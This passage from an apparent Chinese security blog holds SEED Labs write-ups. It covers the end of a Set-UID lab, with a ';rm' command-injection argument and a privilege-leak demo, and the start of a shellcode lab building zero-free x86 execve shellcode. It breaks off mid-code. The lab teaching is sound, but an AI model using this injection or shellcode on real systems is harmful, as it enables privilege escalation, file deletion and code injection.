alt="image-20251124164258603"></p><p>（3）执行task8程序，删除hello.c文件（不可写）</p><p>根据对代码的说明，我们在命令行输入时需要在task8后面加上参数，然后传递给argv，此时只需让argv[1]包含我们想要执行的删除命令即可，因为command为v[0]+v[1],也就是/bin/cat v[1],因为argv为字符串数组，所以参数应该输入字符串，想要同时在命令行执行两个命令，可以用”;”来进行分割，所以我们在seed用户下执行以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./task8 <span class="string">&quot;home1/hello.c;rm home1/hello.c&quot;</span></span><br></pre></td></tr></table></figure><p>那么此时执行的命令为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/cat home1/hello.c；<span class="built_in">rm</span> home1/hello.c</span><br></pre></td></tr></table></figure><p>（九）Task 9：权限泄露<br>1.实验目的与原理</p><p>目的：利用权限泄露，对一个没有写权限的root文件写入字符串</p><p>原理：Set-UID程序会在不需要root权限时释放root权限，但是有时候仅仅是将程序的拥有者变为非root用户，进程仍然拥有root权限下的一些功能，执行一些root权限下才能进行的操作</p><p>示例代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="comment">/* Assume that /etc/zzz is an important system file,</span></span><br><span class="line"><span class="comment">    * and it is owned by root with permission 0644.</span></span><br><span class="line"><span class="comment">    * Before running this program, you should creat</span></span><br><span class="line"><span class="comment">    * the file /etc/zzz first. */</span></span><br><span class="line">    fd = <span class="built_in">open</span>(<span class="string">&quot;/home/seed/etc/zzz&quot;</span>, O_RDWR | O_APPEND);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Cannot open /home/seed/etc/zzz\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;        <span class="comment">/* Simulate the tasks conducted by the program */</span></span><br><span class="line">    <span class="built_in">sleep</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">/* After the task, the root privileges are no longer needed,</span></span><br><span class="line"><span class="comment">    it’s time to relinquish the root privileges permanently. */</span></span><br><span class="line"> </span><br><span class="line">    <span class="built_in">setuid</span>(<span class="built_in">getuid</span>());             <span class="comment">/* getuid() returns the real uid */</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (fork()) </span><br><span class="line">    &#123; <span class="comment">/* In the parent process */</span></span><br><span class="line">        <span class="built_in">close</span> (fd);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">write</span> (fd, <span class="string">&quot;Malicious Data\n&quot;</span>, <span class="number">15</span>);</span><br><span class="line">        <span class="built_in">close</span> (fd);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码解释：</p><p>根据注释，我们首先需要创建一个权限为0644且为根用户所有的文件。然后模拟使用root权限；任务完成后，不再需要根权限，通过setuid(getuid())放弃根权限，恢复进程的拥有者为真实执行该进程的用户ID；然后通过fork创建一个子进程，父进程关闭打开的文件，子进程向创建的新文件中写入字符串。</p><ol start="2"><li>root下创建一个etc文件夹，文件夹内创建zzz文件，并设置其权限为0644</li></ol><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211132744963.png" alt="image-20251124165220959"></p><p>zzz文件内容：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;HELLO WORLD&quot;</span></span><br></pre></td></tr></table></figure><ol start="3"><li>编译示例代码，并设置为Set-UID根程序，在seed下运行</li></ol><p>修改示例代码：将文件设置为我们创建的zzz文件：</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211132745683.png" alt="image-20251124165343104"></p><p>然后重新编译并设置为Set-UID根程序：</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211132746377.png" alt="image-20251124165640521"></p><p>在seed用户下运行：</p><p>我们发现字符串成功写入zzz文件，而zzz文件是root下的只读文件。</p><ol start="4"><li>现象解释</li></ol><p>运行Set-UID程序时，进程暂时获得root权限，打开zzz文件时，获得了root权限下的读写文件、向文件中添加内容的权限，当使用setuid()释放root权限时，没有释放进程已经获得的特权功能—读写文件、向文件中添加内容；导致仅仅是将程序的拥有者降为非root用户，然后进程还拥有root权限下的读写文件、向文件中添加内容的功能，所以造成了权限泄露的问题，当执行fork创建子进程后在子进程中返回0，父进程中返回子进程的PID，父进程打开文件etc/zzz后，子进程不是直接修改文件/etc/zzz，而是修改了缓冲区中的文字，即在setuid之前，zzz文件就已经被打开了，只要将语句setuid(getuid())移至调用open函数之前，就可以避免。</p>]]></content>
      
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Environment Variable </tag>
            
            <tag> Set-UID </tag>
            
            <tag> Seed-Labs </tag>
            
            <tag> System Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Seed-Labs 2.0】Shellcode Development Lab</title>
      <link href="/posts/1ad5be0d.html"/>
      <url>/posts/1ad5be0d.html</url>
      
        <content type="html"><![CDATA[<h2 id="【Seed-Labs-2-0】Shellcode-Development-Lab">【Seed-Labs 2.0】Shellcode Development Lab</h2><p><strong>实验环境</strong><br>虚拟机环境：SEED-labs-ubuntu 20.04<br>使用软件：Oracle VM VirtualBox7.1.0</p><p><strong>实验概述</strong><br>Shellcode 广泛用于许多涉及代码注入的攻击中。本实验的目的是帮助学生了解这些技术，以便他们能编写自己的 shellcode。编写 shellcode 有几个难点，一是要确保二进制中没有零，二是要找出命令中使用的数据地址。</p><p>第一个挑战并不难解决，而且有多种解决方法。第二个难题的解决方案导致了两种典型的 shellcode 编写方法。一种方法是在执行过程中将数据推入堆栈，因此可以从堆栈指针中获取它们的地址。在第二种方法中，数据存储在代码区，紧随调用指令之后。执行调用指令时，数据地址被视为返回地址，并被推入堆栈。这两种解决方案都非常优雅，希望同学们能学会这两种技术。本实验包括以下内容：</p><p>Shellcode<br>Assembly code<br>Disassembling</p><h3 id="TASK1-Writing-Shellcode">TASK1: Writing Shellcode</h3><p>在本任务中，我们将首先从 shellcode 示例开始，演示如何编写 shellcode。在之后的任务中我们会通过修改 shellcode 来完成各种任务。</p><p>Shellcode 通常使用汇编语言编写，汇编语言取决于计算机体系结构。我们将使用英特尔架构，它有两种类型的处理器：x86（32 位 CPU）和 x64（64 位 CPU）。在本任务中，我们将重点关注 32 位 shellcode。在最后一项任务中，我们将切换到 64 位 shellcode。尽管现在大多数计算机都是 64 位计算机，但它们仍可运行 32 位程序。</p><p>本节共有四个小任务</p><p>a：The Entire Process<br>b：Eliminating Zeros from the Code<br>c：Providing Arguments for System Calls<br>d：Providing Environment Variables for execve()<br><strong>补充： C语言的编译过程</strong><br>可参考这篇文章详细学习C语言的编译过程 The Four Stages of Compiling a C Program</p><p>编译 C 程序是一个多阶段的过程，可以分为四个主要阶段：<br>预处理 (Preprocessing)、编译 (Compilation)、汇编 (Assembly) 和链接 (Linking)。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211133005304.png" alt="image-20251111162001012"></p><p><strong>1.预处理（Preprocessing）</strong><br>在这个阶段，以 # 开头的行被预处理器 (Preprocessor) 解释为命令。这些命令用于减少代码重复，例如引入文件 (Include Files)、定义宏 (Define Macros) 和条件性地省略代码。在处理命令之前，预处理器会连接续行并剥离注释。</p><p><strong>2.编译（Compilation）</strong><br>编译阶段将预处理后的代码转换为特定于目标处理器架构 (Target Processor Architecture) 的汇编指令 (Assembly Instructions)。此阶段的输出是人类可读的中间语言 (Intermediate Language)。</p><p><strong>3.汇编（Assembly）</strong><br>在这一阶段，汇编器 (Assembler) 将汇编指令转换为目标代码 (Object Code)。生成的输出是处理器能够执行的实际指令。</p><p><strong>4.链接（Linking）</strong><br>链接阶段将汇编生成的目标代码合并成最终的可执行程序 (Executable Program)。链接器 (Linker) 会重新排列现有的对象代码，确保程序中的函数调用能够成功，并添加库函数 (Library Functions) 的代码。</p><p>Task 1.a: The Entire Process<br>在本任务中，我们提供了一个基本的 x86 shellcode 文件 mysh.s，作为示例文件用以演示如何从头开始编写 shellcode。mysh.s 代码如下所示。</p><pre><code>section .text  global _start    _start:      ; Store the argument string on stack      xor  eax, eax       push eax          ; Use 0 to terminate the string      push &quot;//sh&quot;      push &quot;/bin&quot;      mov  ebx, esp     ; Get the string address      ; Construct the argument array argv[]      push eax          ; argv[1] = 0      push ebx          ; argv[0] points &quot;/bin//sh&quot;      mov  ecx, esp     ; Get the address of argv[]         ; For environment variable       xor  edx, edx     ; No env variables       ; Invoke execve()      xor  eax, eax     ; eax = 0x00000000      mov   al, 0x0b    ; eax = 0x0000000b      int 0x80</code></pre><p><strong>Compiling to object code</strong>. 我们使用 nasm 编译上述汇编代码 (mysh.s)，它是英特尔 x86 和 x64 架构的汇编器和反汇编器。-f elf32 选项表示我们要将代码编译为 32 位 ELF 二进制格式。可执行和可链接格式（ELF）是可执行文件、目标代码、共享库的通用标准文件格式。对于 64 位汇编代码，应使用 elf64。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> nasm <span class="operator">-f</span> elf32 mysh.s <span class="literal">-o</span> mysh.o</span><br></pre></td></tr></table></figure><p><strong>Linking to generate final binary</strong>. 得到目标代码 mysh.o 后，如果想生成可执行的二进制文件，可以运行链接程序 ld，这是编译的最后一步。-m elf i386 选项表示生成 32 位 ELF 二进制文件。完成这一步后，我们就能得到最终的可执行代码 mysh。如果运行它，我们就能得到一个 shell。在运行 mysh 之前和之后，我们使用 echo $$ 打印出当前 shell 的进程 ID，因此我们可以清楚地看到 mysh 确实启动了一个新的 shell。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211133005193.png" alt="image-20251111162552177"></p><p><strong>Getting the machine code</strong>. 在攻击过程中，我们只需要 shellcode 的机器代码，而不需要包含实际机器代码以外数据的独立可执行文件。从技术上讲，只有机器代码才被称为 shellcode。因此，我们需要从可执行文件或目标文件中提取机器代码。有多种方法可以做到这一点。一种方法是使用 objdump 命令反汇编可执行文件或对象文件。</p><p>汇编代码有两种不同的常用语法模式，一种是 AT&amp;T 语法模式，另一种是 Intel 语法模式。默认情况下，objdump 使用 AT&amp;T 模式。在下文中，我们使用 -Mintel 选项，以英特尔模式生成汇编代码。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211133005242.png" alt="image-20251111165027867"></p><p>在上述打印输出中，红色框出的数字是机器代码。可以使用 xxd 命令打印出二进制文件的内容，这样就能从打印输出中找出 shellcode 的机器码。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211133005446.png" alt="image-20251111165129170"></p><p>在攻击代码中使用 shellcode。在实际攻击中，我们需要在攻击代码（如 Python 或 C 程序）中加入 shellcode。我们通常会将机器码存储在数组中，但如果手动将上面打印的机器码转换为 Python 和 C 程序中的数组赋值，则会相当繁琐，尤其是当我们需要在实验室中多次执行这一过程时。我们编写了以下 <a href="http://convert.py">convert.py</a> 帮助这一过程。只需复制从 xxd 命令中得到的内容（只包括 shellcode 部分），然后替换掉下面的代码红色框中得内容。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211133005369.png" alt="image-20251111165510789"></p><p>运行 <a href="http://convert.py">convert.py</a> 程序将打印出以下 Python 代码，您可以将其加入攻击代码中。它将 shellcode 保存在一个 Python 数组中。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211133005408.png" alt="image-20251111165459485"></p><h3 id="Task-1-b-Eliminating-Zeros-from-the-Code">Task 1.b. Eliminating Zeros from the Code</h3><p>Shellcode 广泛用于缓冲区溢出攻击。在许多情况下，漏洞是由字符串复制（如 strcpy() 函数）引起的。在这些字符串复制函数中，0 被视为字符串的结尾。因此，如果我们在 shellcode 中间有一个零，字符串复制将无法从该 shellcode 复制零之后的内容到目标缓冲区，因此攻击将无法成功。</p><p>虽然并非所有漏洞都是零的问题，但在 shellcode 中要求机器代码中不能有任何零；否则，shellcode 的应用将受到限制。</p><p><strong>任务</strong>： shellcode中，push的字符串是&quot;/bin//sh&quot;，其本应该是&quot;/bin/sh&quot;，但是因为在32位程序中，需要4byte对齐，所以将/sh改为//sh。任务要求使用/bin/bash，不允许添加多余的/进行调用，且shellcode中不允许出现0。</p><p>1.按照倒序对/bin/bash和4 bytes对齐进行入栈，则顺序为h，/bas，/bin，最后的h显然不够4 bytes，高位会补0，但我们不希望出现0，所以直接对al赋值即可。完整代码如下。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">section</span> .text</span><br><span class="line">  <span class="meta">global</span> _start</span><br><span class="line"><span class="symbol">    _start:</span></span><br><span class="line">      <span class="comment">; Store the argument string on stack</span></span><br><span class="line">      <span class="keyword">xor</span>  <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line">      <span class="keyword">push</span> <span class="built_in">eax</span>          <span class="comment">; Use 0 to terminate the string</span></span><br><span class="line">      <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line">      <span class="keyword">mov</span> <span class="built_in">al</span>, <span class="string">&quot;h&quot;</span></span><br><span class="line">      <span class="keyword">push</span> <span class="built_in">eax</span></span><br><span class="line">      <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line">      <span class="keyword">push</span> <span class="string">&quot;/bas&quot;</span></span><br><span class="line">      <span class="keyword">push</span> <span class="string">&quot;/bin&quot;</span></span><br><span class="line">      <span class="keyword">mov</span>  <span class="built_in">ebx</span>, <span class="built_in">esp</span>     <span class="comment">; Get the string address</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">; Construct the argument array argv[]</span></span><br><span class="line">      <span class="keyword">push</span> <span class="built_in">eax</span>          <span class="comment">; argv[1] = 0</span></span><br><span class="line">      <span class="keyword">push</span> <span class="built_in">ebx</span>          <span class="comment">; argv[0] points &quot;/bin//sh&quot;</span></span><br><span class="line">      <span class="keyword">mov</span>  <span class="built_in">ecx</span>, <span class="built_in">esp</span>     <span class="comment">; Get the address of argv[]</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">; For environment variable </span></span><br><span class="line">      <span class="keyword">xor</span>  <span class="built_in">edx</span>, <span class="built_in">edx</span>     <span class="comment">; No env variables </span></span><br><span class="line"></span><br><span class="line">      <span class="comment">; Invoke execve()</span></span><br><span class="line">      <span class="keyword">xor</span>  <span class="built_in">eax</span>, <span class="built_in">eax</span>     <span class="comment">; eax = 0x00000000</span></span><br><span class="line">      <span class="keyword">mov</span>   <span class="built_in">al</span>, <span class="number">0x0b</span>    <span class="comment">; eax = 0x0000000b</span></span><br><span class="line">      <span class="keyword">int</span> <span class="number">0x80</span></span><br></pre></td></tr></table></figure><p>2.修改后，运行得到下面的结果，即修改成功。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211133007056.png" alt="image-20251111170121002"></p><h3 id="Task-1-c-Providing-Arguments-for-System-Calls"><strong>Task 1.c. Providing Arguments for System Calls</strong></h3><p>任务内容： 在这项任务中，我们需要运行以下命令，即使用 execve 执行以下命令，该命令使用 /bin/sh 执行 “ls -la ”命令。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/bin/</span>sh -c <span class="string">&quot;ls -la&quot;</span></span><br></pre></td></tr></table></figure><p><strong>任务分析</strong>： 从C语言看，execve函数的原型为</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">execve</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">char</span> *<span class="type">const</span> argv[], <span class="type">char</span> *<span class="type">const</span> envp[])</span></span>;</span><br></pre></td></tr></table></figure><ul><li>第一个参数filename是字符串代表的文件路径。</li><li>第二个参数argv[]是数组指针，数组中每个元素是一个指针，指向一个参数，且最后一个元素为NULL，表示数组结束。</li><li>最后一个参数envp[]是传递给执行文件的新环境变量数组。</li></ul><p>所以在这条新命令中，argv 数组需要构造参数下面的参数数组，应包含以下四个元素。</p><p>argv[3] = 0<br>argv[2] = “ls -la”<br>argv[1] = “-c”<br>argv[0] = “/bin/sh”<br>1.将构造的参数压入栈中，这里的”-c”和”la”都是16位，所以直接对16位寄存器ax赋值即可。</p><p>参数ls -la构造如下，然后压入栈中。此时将栈顶指针地址移动到ecx寄存器，表示该参数其地址存储在ecx。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="string">&quot;la&quot;</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">eax</span></span><br><span class="line"><span class="keyword">push</span> <span class="string">&quot;ls -&quot;</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">edx</span>, <span class="built_in">esp</span></span><br></pre></td></tr></table></figure><p>参数-c构造如下，然后压入栈中。此时将栈顶指针地址移动到edx寄存器，表示该参数其地址存储在edx。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="string">&quot;-c&quot;</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">eax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ecx</span>, <span class="built_in">esp</span></span><br></pre></td></tr></table></figure><p>参数/bin//sh构造如下，然后压入栈中。此时将栈顶指针地址移动到ebx寄存器，表示该参数其地址存储在ebx</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">eax</span></span><br><span class="line"><span class="keyword">push</span> <span class="string">&quot;//sh&quot;</span></span><br><span class="line"><span class="keyword">push</span> <span class="string">&quot;/bin&quot;</span></span><br><span class="line"><span class="keyword">mov</span>  <span class="built_in">ebx</span>, <span class="built_in">esp</span>     <span class="comment">; Get the string address</span></span><br></pre></td></tr></table></figure><p>2.将args参数列表压入栈中，然后将栈顶指针esp移动到ecx寄存器作为系统调用第二个参数，这样args参数传递就完成了。同时args[0]即path参数的地址已经在ebx寄存器中，这个参数地址在我们之前构造时就已经放在了ebx寄存器中了，因此path参数的传递也完成了。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">push</span> <span class="built_in">eax</span>          <span class="comment">; argv[3] = 0</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">edx</span>          <span class="comment">; argv[2] points &quot;ls -la&quot;</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">ecx</span>          <span class="comment">; argv[1] points &quot;-c&quot;</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">ebx</span>          <span class="comment">; argv[0] points &quot;/bin//sh&quot;</span></span><br><span class="line"><span class="keyword">mov</span>  <span class="built_in">ecx</span>, <span class="built_in">esp</span>     <span class="comment">; Get the address of argv[]</span></span><br></pre></td></tr></table></figure><p>3.完整代码如下：</p><pre><code>section .text  global _start    _start:      ; Store the argument string on stack         xor eax, eax      mov ax, &quot;la&quot;      push eax      push &quot;ls -&quot;      mov edx, esp      xor eax, eax      mov ax, &quot;-c&quot;      push eax      mov ecx, esp      xor eax, eax      push eax      push &quot;//sh&quot;      push &quot;/bin&quot;      mov  ebx, esp     ; Get the string address      ; Construct the argument array argv[]      push eax          ; argv[3] = 0      push edx          ; argv[2] points &quot;ls -la&quot;      push ecx          ; argv[1] points &quot;-c&quot;      push ebx          ; argv[0] points &quot;/bin//sh&quot;      mov  ecx, esp     ; Get the address of argv[]         ; For environment variable       xor  edx, edx     ; No env variables       ; Invoke execve()      xor  eax, eax     ; eax = 0x00000000      mov   al, 0x0b    ; eax = 0x0000000b      int 0x80</code></pre><p>4.最后编译链接shellcode，执行结果如下</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211133007687.png" alt="image-20251111170710336"></p><h3 id="Task-1-d-Providing-Environment-Variables-for-execve"><strong>Task 1.d. Providing Environment Variables for execve()</strong></h3><p><strong>任务内容</strong>： 我们将编写一个名为 myenv.s 的 shellcode。当这个程序被执行时，它会执行“/usr/bin/env ”命令，可以打印出以下环境变量：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ./myenv</span><br><span class="line"><span class="attribute">aaa</span>=1234</span><br><span class="line"><span class="attribute">bbb</span>=5678</span><br><span class="line"><span class="attribute">cccc</span>=1234</span><br></pre></td></tr></table></figure><p><strong>任务分析</strong>： 环境变量 cccc 的值必须正好是 4 字节（尾部不允许添加空格）。我们故意使该环境变量字符串（名称和值）的长度不是 4 的倍数。要编写这样的 shellcode，我们需要在堆栈上构建一个环境变量数组，并在调用 execve() 之前将该数组的地址存储到 edx 寄存器中。在堆栈上构造这个数组的方法与我们构造 argv[] 数组的方法完全相同。每个元素为指向环境变量的指针，每个环境变量的形式是name=value形式的字符串，字符串的结尾是0，env[]数组的最后一个元素为0。</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">env[<span class="number">3</span>] = <span class="number">0</span><span class="comment"> // 0 marks the end of the array</span></span><br><span class="line">env[<span class="number">2</span>] = address <span class="built_in">to</span> <span class="keyword">the</span> <span class="string">&quot;cccc=1234&quot;</span> <span class="keyword">string</span></span><br><span class="line">env[<span class="number">1</span>] = address <span class="built_in">to</span> <span class="keyword">the</span> <span class="string">&quot;bbb=5678&quot;</span> <span class="keyword">string</span></span><br><span class="line">env[<span class="number">0</span>] = address <span class="built_in">to</span> <span class="keyword">the</span> <span class="string">&quot;aaa=1234&quot;</span> <span class="keyword">string</span></span><br></pre></td></tr></table></figure><p>1.首先构建env[]数组，每个元素为指向环境变量的指针，每个环境变量的形式是name=value形式的字符串，字符串的结尾是0，env[]数组的最后一个元素为0。</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">env[<span class="number">3</span>] = <span class="number">0</span></span><br><span class="line">env[<span class="number">2</span>] = address <span class="built_in">to</span> <span class="keyword">the</span> <span class="string">&quot;cccc=1234&quot;</span> <span class="keyword">string</span></span><br><span class="line">env[<span class="number">1</span>] = address <span class="built_in">to</span> <span class="keyword">the</span> <span class="string">&quot;bbb=5678&quot;</span> <span class="keyword">string</span></span><br><span class="line">env[<span class="number">0</span>] = address <span class="built_in">to</span> <span class="keyword">the</span> <span class="string">&quot;aaa=1234&quot;</span> <span class="keyword">string</span></span><br></pre></td></tr></table></figure><p>2.完整代码如下：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">section</span> .text</span><br><span class="line">  <span class="meta">global</span> _start</span><br><span class="line"><span class="symbol">    _start:</span></span><br><span class="line">      <span class="comment">; Store the argument string on stack</span></span><br><span class="line">      <span class="keyword">xor</span>  <span class="built_in">eax</span>, <span class="built_in">eax</span> </span><br><span class="line">      <span class="keyword">push</span> <span class="built_in">eax</span>          <span class="comment">; Use 0 to terminate the string</span></span><br><span class="line">      <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line">      <span class="keyword">mov</span> <span class="built_in">al</span>, <span class="string">&quot;4&quot;</span></span><br><span class="line">      <span class="keyword">push</span> <span class="built_in">eax</span></span><br><span class="line">      <span class="keyword">push</span> <span class="string">&quot;=123&quot;</span></span><br><span class="line">      <span class="keyword">push</span> <span class="string">&quot;cccc&quot;</span></span><br><span class="line">      <span class="keyword">mov</span> <span class="built_in">ebx</span>, <span class="built_in">esp</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line">      <span class="keyword">push</span> <span class="built_in">eax</span></span><br><span class="line">      <span class="keyword">push</span> <span class="string">&quot;5678&quot;</span></span><br><span class="line">      <span class="keyword">push</span> <span class="string">&quot;bbb=&quot;</span></span><br><span class="line">      <span class="keyword">mov</span> <span class="built_in">edx</span>, <span class="built_in">esp</span></span><br><span class="line">     </span><br><span class="line">      <span class="keyword">push</span> <span class="built_in">eax</span></span><br><span class="line">      <span class="keyword">push</span> <span class="string">&quot;1234&quot;</span></span><br><span class="line">      <span class="keyword">push</span> <span class="string">&quot;aaa=&quot;</span></span><br><span class="line">      <span class="keyword">mov</span> <span class="built_in">ecx</span>, <span class="built_in">esp</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">; For environment variable </span></span><br><span class="line">      <span class="keyword">push</span> <span class="built_in">eax</span></span><br><span class="line">      <span class="keyword">push</span> <span class="built_in">ebx</span></span><br><span class="line">      <span class="keyword">push</span> <span class="built_in">edx</span></span><br><span class="line">      <span class="keyword">push</span> <span class="built_in">ecx</span></span><br><span class="line">      <span class="keyword">mov</span> <span class="built_in">edx</span>, <span class="built_in">esp</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">push</span> <span class="built_in">eax</span></span><br><span class="line">      <span class="keyword">push</span> <span class="string">&quot;/env&quot;</span></span><br><span class="line">      <span class="keyword">push</span> <span 